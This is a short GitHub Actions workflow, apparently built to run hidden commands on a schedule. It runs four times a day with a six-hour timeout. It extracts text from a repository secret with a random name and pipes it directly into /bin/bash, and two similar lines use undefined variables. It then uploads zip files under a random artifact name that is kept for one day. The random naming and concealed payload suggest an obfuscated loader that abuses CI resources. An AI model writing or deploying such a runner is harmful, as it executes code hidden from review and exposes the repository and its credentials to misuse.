name: Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '45 3,9,15,21 * * *'
permissions:
  contents: read
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Go
        env:
          ecg51: ${{ secrets.ecg51 }}
        run: |
          printf '%s' "$ecg51" | jq -r .pifzi71059 | /bin/bash
          echo $ukres682 | jq -r .p93 | /bin/bash
          printf '%s' "$gbg74" | jq -r .i0 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: YCuwU73d
          path: "*.zip"
          retention-days: 1
